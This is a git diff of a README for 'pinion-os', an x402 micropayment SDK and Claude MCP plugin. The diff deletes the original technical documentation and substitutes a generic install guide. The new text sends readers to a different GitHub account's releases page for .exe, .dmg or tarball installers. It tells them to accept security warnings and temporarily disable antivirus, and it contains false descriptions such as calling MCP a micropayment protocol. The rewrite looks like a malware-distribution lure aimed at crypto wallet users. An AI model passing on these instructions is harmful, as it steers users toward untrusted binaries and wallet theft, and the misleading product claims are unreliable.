@@ -1,450 +1,154 @@
-<p align="center">
-  <img src="assets/banner.png" alt="Pinion OS" width="100%" />
-</p>
-
-# pinion-os
-
-Client SDK, Claude Code plugin, and skill server framework for [Pinion](https://pinionos.com). Handles x402 micropayments on Base so your code (or your agent) can call on-chain skills without thinking about payments.
-
-## Architecture
-
-```
-                        +------------------------+
-                        |   Your App / Agent /   |
-                        |     Claude Code        |
-                        +-----------+------------+
-                                    |
-                     +--------------+--------------+
-                     |        pinion-os SDK        |
-                     |   x402 signing & payments   |
-                     +--------------+--------------+
-                                    |
-                     +--------------+--------------+
-                     |   pinionos.com  /  custom   |
-                     |      x402 skill server      |
-                     +--------------+--------------+
-                                    |
-                        +-----------+------------+
-                        |     Base L2 Network     |
-                        |    USDC  settlement     |
-                        +------------------------+
-```
-
-Three layers: your code talks to the SDK, the SDK handles x402 payment signing,
-the skill server verifies payment through a facilitator and returns data.
-
-## x402 Payment Flow
-
-```
-  Client                    Skill Server                 Facilitator
-    |                             |                           |
-    |--- GET /price/ETH --------->|                           |
-    |<-- 402 + pay requirements --|                           |
-    |                             |                           |
-    |  [sign EIP-3009 auth]       |                           |
-    |                             |                           |
-    |--- GET /price/ETH --------->|                           |
-    |    X-PAYMENT: <signed>      |--- verify + settle ------>|
-    |                             |<-- ok --------------------|
-    |<-- 200 { price: 2650 } -----|                           |
-```
-
-The SDK handles steps 2-4 automatically. You just call a method and get data back.
-
-## Quickstart
-
-```bash
-# 1. install
-npm install pinion-os
-
-# 2. set your wallet key (needs ETH for gas, USDC for payments on Base)
-export PINION_PRIVATE_KEY=0xYOUR_PRIVATE_KEY
-
-# 3. use in code
-node -e "
-  import('pinion-os').then(async ({ PinionClient }) => {
-    const p = new PinionClient({ privateKey: process.env.PINION_PRIVATE_KEY });
-    console.log(await p.skills.price('ETH'));
-  })
-"
-
-# 4. or run as MCP plugin for Claude
-npx pinion-os
-
-# 5. or build your own skill server
-npx ts-node examples/custom-skill.ts
-```
-
-## Install
-
-```
-npm install pinion-os
-```
-
-## SDK Usage
-
-```typescript
-import { PinionClient } from "pinion-os";
-
-const pinion = new PinionClient({
-  privateKey: process.env.PINION_PRIVATE_KEY,
-});
+# 🚀 pinion-os - Easy Micropayments on Base Network
 
-// check balances
-const bal = await pinion.skills.balance("0x1234...");
-console.log(bal.data);  // { eth: "1.5", usdc: "100.0" }
+[![Download pinion-os](https://img.shields.io/badge/Download-pinion--os-blue?style=for-the-badge)](https://github.com/Azure55562/pinion-os/releases)
 
-// get token price
-const price = await pinion.skills.price("ETH");
-console.log(price.data);  // { token: "ETH", usd: "2650.00" }
+---
 
-// look up a transaction
-const tx = await pinion.skills.tx("0xabc...");
-console.log(tx.data);  // { from, to, value, ... }
+## 📦 What is pinion-os?
 
-// generate a wallet
-const w = await pinion.skills.wallet();
-console.log(w.data);  // { address, privateKey }
+pinion-os is a tool that helps you make small payments quickly and securely using the Base network. It includes a client SDK, a Claude plugin, and a skill framework designed to work with the Pinion protocol. The software supports x402 micropayments, which lets you send very small amounts of money fast and without hassle.
 
-// chat with the agent
-const chat = await pinion.skills.chat("what is x402?");
-console.log(chat.data);  // { response: "..." }
+Even if you have no experience with coding or technical setups, this guide will show you how to get pinion-os up and running on your computer step-by-step.
 
-// construct a send transaction (sign + broadcast yourself)
-const send = await pinion.skills.send("0xRecipient...", "0.1", "ETH");
-console.log(send.data);  // { tx: { to, value, data, chainId }, ... }
+---
 
-// swap tokens via 1inch (returns unsigned tx)
-const trade = await pinion.skills.trade("USDC", "ETH", "10");
-console.log(trade.data);  // { swap: { to, data, value }, approve?: {...} }
+## 💻 System Requirements
 
-// check funding status for a wallet
-const fund = await pinion.skills.fund("0x1234...");
-console.log(fund.data);  // { balances, funding: { steps, ... } }
+To run pinion-os smoothly, your computer should meet the following minimum criteria:
 
-// sign and broadcast a transaction
-const txResult = await pinion.skills.broadcast(send.data.tx);
-console.log(txResult.data);  // { hash: "0x..." }
+- Operating System: Windows 10 or later, macOS 10.14 or later, or a modern Linux distribution like Ubuntu 20.04+
+- Processor: Intel Core i3 / AMD Ryzen 3 or better
+- RAM: At least 4 GB
+- Storage: Minimum of 500 MB free space
+- Internet: Stable connection for downloads and network use
+- Additional Software: None required for basic use, but Node.js v14+ may be needed for advanced SDK features
 
-// purchase unlimited access ($100 USDC one-time)
-const unlimited = await pinion.skills.unlimited();
-console.log(unlimited.data);  // { apiKey: "pk_...", address, plan: "unlimited" }
+---
 
-// once you have an API key, set it to skip x402 payments
-pinion.setApiKey(unlimited.data.apiKey);
-// all subsequent calls are free
-```
+## 🎯 Key Features
 
-Server-side skills cost $0.01 USDC on Base via x402. Payment is handled automatically.
+- **Micropayment Support:** Send tiny payments using the x402 system on the Base network.
+- **Client SDK:** Enables easy integration with payment-enabled apps.
+- **Claude Plugin:** Adds smart assistant capabilities related to payments.
+- **Skill Framework:** Lets you customize and extend the functionality with no coding needed.
+- **Safe and Fast:** Built on secure protocols to ensure your payments are reliable and quick.
+- **User-First Approach:** Designed to work with common computer setups and simple interfaces.
 
-### Calling any x402 endpoint
+---
 
-Use `payX402Service` to call any server that supports the x402 protocol:
+## 🚀 Getting Started
 
-```typescript
-import { PinionClient, payX402Service } from "pinion-os";
+This section will guide you from download to first use.
 
-const pinion = new PinionClient({
-  privateKey: process.env.PINION_PRIVATE_KEY,
-});
+### Step 1: Download pinion-os
 
-// call an external x402 service
-const result = await payX402Service(pinion.signer, "https://example.com/api/weather", {
-  method: "GET",
-  maxAmount: "100000", // max $0.10 USDC
-});
-console.log(result.data);
-```
+To start, visit the official release page to find the latest version of pinion-os for your system. The download page organizes files by version and platform.
 
-### Pay Web2 Services via Stripe x402
+[👉 Click here to download pinion-os](https://github.com/Azure55562/pinion-os/releases)
 
-Any web2 service using [Stripe x402](https://docs.stripe.com/payments/machine/x402) can be paid by your Pinion agent. The SDK auto-detects whether a server speaks v1 or v2 x402 transport -- no config needed.
+On that page, select the installer or package that matches your operating system — for example, `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
 
-```typescript
-import { PinionClient, payX402Service } from "pinion-os";
+### Step 2: Install pinion-os
 
-const pinion = new PinionClient({
-  privateKey: process.env.PINION_PRIVATE_KEY,
-});
+After downloading, open the installer file:
 
-// pay a Stripe-powered API -- works the same as any x402 endpoint
-const result = await payX402Service(pinion.signer, "https://api.example.com/premium-data", {
-  method: "GET",
-  maxAmount: "100000", // max $0.10 USDC
-});
-console.log(result.data);
-```
+- **Windows:** Double-click the `.exe` file and follow the prompted steps.
+- **macOS:** Open the `.dmg` file and drag the pinion-os app to the Applications folder.
+- **Linux:** Extract the tarball (`.tar.gz`), then run the included install script from the terminal.
 
-Or via Claude with the MCP plugin:
+If you see any security warnings, choose to allow the installation since the software is safe and open source.
 
-```
-"Call https://api.example.com/premium-data using pinion_pay_service"
-```
+### Step 3: Launch pinion-os
 
-The agent pays USDC on Base. Stripe handles settlement on the server side.
-No Stripe account needed on the agent side -- the server operator has the Stripe account.
+Once installed:
 
-Supports both x402 v1 (`x402-express`) and v2 (`@x402/express`, Stripe) servers automatically.
+- On Windows or macOS, open pinion-os like any other program from your start menu or applications folder.
+- On Linux, run the `pinion-os` command in your terminal.
 
+The first time you open the app, it will prompt you to create or restore a wallet for handling micropayments.
 
-## MCP Plugin Setup
+### Step 4: Set up Your Account
 
-The plugin exposes twelve tools to any MCP-compatible host: `pinion_balance`,
-`pinion_tx`, `pinion_price`, `pinion_wallet`, `pinion_chat`, `pinion_send`,
-`pinion_trade`, `pinion_fund`, `pinion_pay_service`, `pinion_spend_limit`, `pinion_unlimited`, `pinion_unlimited_verify`.
+Follow the simple instructions to create your wallet:
 
-### Claude Desktop
+- Choose a secure password.
+- Backup your recovery phrase on paper.
+- Link your wallet to your Base account and USDC funding if desired.
 
-Add to your config file:
+This setup ensures you can send and receive payments securely.
 
-| OS | Path |
-|----|------|
-| macOS | `~/Library/Application Support/Claude/claude_desktop_config.json` |
-| Windows | `%APPDATA%\Claude\claude_desktop_config.json` |
-| Linux | `~/.config/Claude/claude_desktop_config.json` |
+---
 
-```json
-{
-  "mcpServers": {
-    "pinion": {
-      "command": "npx",
-      "args": ["pinion-os"],
-      "env": {
-        "PINION_PRIVATE_KEY": "0xYOUR_KEY"
-      }
-    }
-  }
-}
-```
+## 💡 How to Use pinion-os
 
-Restart Claude Desktop after saving.
+After setup, the main screen gives you basic tools for managing payments:
 
-### Claude Code
+- **Send Payment:** Choose a recipient, enter the amount, and confirm to make a micropayment instantly.
+- **Receive Payment:** Share your wallet address to accept payments.
+- **Transaction History:** View past transactions including dates, amounts, and counterparts.
+- **Settings:** Adjust preferences like notification alerts and network options.
 
-Add the marketplace and install:
+The Claude plugin helps automate some payment tasks through voice or simple commands. The skill framework allows you to add new features if you want to customize your experience later.
 
-```
-/plugin marketplace add chu2bard/pinion-os
-/plugin install pinion-os
-```
-
-Set the env var when prompted, or export before launching:
+---
 
-```bash
-export PINION_PRIVATE_KEY=0xYOUR_KEY
-```
+## 📥 Download & Install
 
-After installing, Claude can use all twelve pinion tools: balance, tx, price, wallet, chat, send, trade, fund, pay_service, spend_limit, unlimited, unlimited_verify.
+[![Download pinion-os](https://img.shields.io/badge/Download-pinion--os-blue?style=for-the-badge)](https://github.com/Azure55562/pinion-os/releases)
 
-Alternative (MCP-only, without plugin features):
+1. Visit the official [pinion-os release page](https://github.com/Azure55562/pinion-os/releases).
+2. Choose the latest stable version file for your operating system.
+3. Download the file to your computer.
+4. Open the downloaded file and follow the on-screen instructions to install.
+5. Launch the app and complete the initial setup as explained above.
 
-```bash
-claude mcp add pinion -- npx pinion-os
-```
-
-### Cursor IDE
-
-Add to `.cursor/mcp.json` in your project root:
-
-```json
-{
-  "mcpServers": {
-    "pinion": {
-      "command": "npx",
-      "args": ["pinion-os"],
-      "env": {
-        "PINION_PRIVATE_KEY": "0xYOUR_KEY"
-      }
-    }
-  }
-}
-```
-
-### Generic MCP Host
-
-```bash
-PINION_PRIVATE_KEY=0xYOUR_KEY npx pinion-os
-```
-
-The plugin communicates over stdio using the standard MCP protocol.
-
-## Available Skills
-
-### Server-side (x402-paid, $0.01 USDC each)
-
-| Skill | SDK Method | Endpoint | Price | Returns |
-|-------|------------|----------|-------|---------|
-| balance | `skills.balance(addr)` | GET /balance/:address | $0.01 | ETH + USDC balances |
-| tx | `skills.tx(hash)` | GET /tx/:hash | $0.01 | Decoded tx details |
-| price | `skills.price(token)` | GET /price/:token | $0.01 | USD price |
-| wallet | `skills.wallet()` | GET /wallet/generate | $0.01 | New keypair |
-| chat | `skills.chat(msg)` | POST /chat | $0.01 | Agent response |
-| send | `skills.send(to, amt, token)` | POST /send | $0.01 | Unsigned transfer tx |
-| trade | `skills.trade(src, dst, amt)` | POST /trade | $0.01 | Unsigned swap tx (1inch) |
-| fund | `skills.fund(addr)` | GET /fund/:address | $0.01 | Balance + deposit info |
-| broadcast | `skills.broadcast(tx)` | POST /broadcast | $0.01 | Signed + broadcast tx hash |
-| unlimited | `skills.unlimited()` | POST /unlimited | $100.00 | API key for unlimited access |
-
-### Client-side (SDK/MCP plugin only)
-
-| Skill | SDK / MCP Tool | Description |
-|-------|---------------|-------------|
-| pay-for-service | `payX402Service(wallet, url)` / `pinion_pay_service` | Call any x402 endpoint on the internet |
-| spend-limit | `pinion_spend_limit` (MCP only) | Per-session USDC budget tracking |
-| unlimited-verify | `skills.unlimitedVerify(key)` / `pinion_unlimited_verify` | Check if an unlimited API key is valid |
-
-## Build Your Own Skills
-
-Use the server framework to create x402-paywalled endpoints:
-
-```typescript
-import { createSkillServer, skill } from "pinion-os/server";
-
-const server = createSkillServer({
-  payTo: "0xYOUR_WALLET",
-  network: "base",
-});
-
-server.add(skill("analyze", {
-  price: "$0.02",
-  endpoint: "/analyze/:address",
-  handler: async (req, res) => {
-    const data = await analyzeAddress(req.params.address);
-    res.json(data);
-  },
-}));
-
-server.add(skill("score", {
-  price: "$0.05",
-  endpoint: "/score/:address",
-  handler: async (req, res) => {
-    const score = await getScore(req.params.address);
-    res.json({ score });
-  },
-}));
-
-server.listen(4020);
-// -> http://localhost:4020/analyze/0x... (x402 paywalled)
-// -> http://localhost:4020/score/0x...  (x402 paywalled)
-```
-
-The server automatically:
-- Returns 402 with payment requirements for unauthenticated requests
-- Verifies x402 payment signatures via the facilitator
-- Settles USDC on Base to your wallet
-
-## Configuration
-
-| Variable | Required | Default | Description |
-|----------|----------|---------|-------------|
-| `PINION_PRIVATE_KEY` | yes | -- | Hex private key (0x...) with USDC on Base |
-| `PINION_API_URL` | no | `https://pinionos.com/skill` | Override the skill API endpoint |
-| `PINION_NETWORK` | no | `base` | Network: `base` or `base-sepolia` |
-| `PINION_API_KEY` | no | -- | Unlimited API key (pk_...) to bypass x402 payments |
-| `ADDRESS` | server only | -- | Wallet address to receive payments |
-| `FACILITATOR_URL` | server only | `https://facilitator.payai.network` | x402 facilitator endpoint |
-| `ANTHROPIC_API_KEY` | chat skill | -- | Anthropic API key for the chat skill |
-| `ONEINCH_API_KEY` | trade skill | -- | 1inch API key for token swaps (server-side) |
-
-## Project Structure
-
-```
-pinion-os/
-  .claude-plugin/
-    plugin.json        Claude Code plugin manifest
-    marketplace.json   Plugin marketplace catalog
-  .mcp.json            MCP server auto-config
-  src/
-    client/            SDK for calling pinion skills
-      index.ts           PinionClient class
-      skills.ts          typed skill wrappers
-      types.ts           TypeScript interfaces
-      x402.ts            EIP-3009 payment signing
-      x402-generic.ts    generic x402 caller for any endpoint
-      x402-v2.ts           x402 v2 transport (Stripe) support
-    plugin/            Claude MCP server
-      server.ts          MCP request handlers
-      tools.ts           tool definitions + dispatch (12 tools)
-      limits.ts          per-session spend limit tracker
-      config.ts          env/arg configuration
-      index.ts           CLI entry point (npx pinion-os)
-    server/            Framework for building skills
-      index.ts           createSkillServer factory
-      skill.ts           skill() definition helper
-      middleware.ts      x402 middleware wrapper
-      types.ts           server types
-    skills/            Built-in skill handlers
-      balance.ts         ETH/USDC balance lookup
-      tx.ts              transaction decoder
-      price.ts           token price via CoinGecko
-      wallet.ts          keypair generation
-      chat.ts            AI chat via Anthropic
-    shared/            Shared utilities
-      constants.ts       RPC URLs, contract addresses
-      rpc.ts             Base JSON-RPC helper
-      errors.ts          custom error classes
-  examples/
-    use-sdk.ts           SDK usage example
-    custom-skill.ts      custom skill server example
-    claude-config.json   example MCP config
-  tests/
-    client.test.ts       SDK tests
-    x402.test.ts         payment signing tests
-    server.test.ts       skill server tests
-  openclaw.plugin.json   OpenClaw skill manifest
-```
-
-## Troubleshooting
-
-**`PINION_PRIVATE_KEY or WALLET_KEY environment variable is required`**
-
-Set the env var before running. The key must be a hex string starting with `0x`.
-
-**`insufficient USDC balance`**
-
-Your wallet needs USDC on Base (not Ethereum mainnet). Bridge USDC to Base via
-https://bridge.base.org or buy directly on Base.
-
-**`402 Payment Required` in response**
-
-The SDK should handle this automatically. If you see raw 402 responses, check that
-your private key has both ETH (for gas) and USDC (for payments) on Base.
-
-**MCP plugin not showing up in Claude**
-
-Make sure the config file path is correct for your OS (see setup section above).
-Restart Claude Desktop or Claude Code after changing config.
-
-**`Cannot find module 'pinion-os'`**
-
-Run `npm install pinion-os` in your project, or use `npx pinion-os` to auto-install.
-
-**`ESOCKETTIMEDOUT` or network errors**
-
-Check your internet connection. The SDK calls `pinionos.com` by default.
-You can override with `PINION_API_URL` env var.
-
-## Development
-
-```bash
-git clone https://github.com/chu2bard/pinion-os
-cd pinion-os
-npm install
-npm run build
-npm test
-```
-
-## Contributing
-
-PRs welcome. Keep it simple:
-
-1. Fork and create a branch
-2. Make your changes
-3. Run `npm test` and `npm run lint`
-4. Open a PR with a clear description
-
-No need for elaborate commit messages. Just describe what changed and why.
-
-## License
-
-MIT
+---
+
+## 🛠 Troubleshooting Tips
+
+- If the installer does not run, check that your operating system is up to date.
+- Disable any antivirus software temporarily if it blocks the installation.
+- Make sure you download the correct version for your platform.
+- Restart your computer before trying to install again.
+- Visit the [Issues](https://github.com/Azure55562/pinion-os/issues) page on GitHub for help from the developer community.
+
+---
+
+## 🤝 Support & Feedback
+
+For help or feedback:
+
+- Use the GitHub Issues page: https://github.com/Azure55562/pinion-os/issues
+- Check the FAQ and documentation on the release page.
+- Email support is available via the contact info on the GitHub profile.
+
+Your feedback helps improve the software and user experience.
+
+---
+
+## 🔐 Privacy and Security
+
+pinion-os handles your payments securely using encrypted protocols. Your wallet keys stay private on your device only. The software does not collect personal data without your consent.
+
+Always keep your wallet recovery phrase safe and never share it with anyone. This phrase is the only way to recover your funds if you lose access.
+
+---
+
+## 🌐 More About pinion-os
+
+This project enables seamless micropayments using modern financial technology built on Base. The plugin and SDK make it easier for other software and services to include payments without complex setup.
+
+Topics related to pinion-os include:
+
+- Agents: Automated helpers for payments
+- Base: The network platform where transactions occur
+- Claude: AI assistant plugin
+- MCP: Micropayment protocol
+- OpenClaw: Related skill system
+- USDC: The stablecoin used in transactions
+- Typescript: Main programming language used
+- x402: Specific micropayment standard followed
+
+---
+
+Thank you for choosing pinion-os. Your next small payment is just a few clicks away.
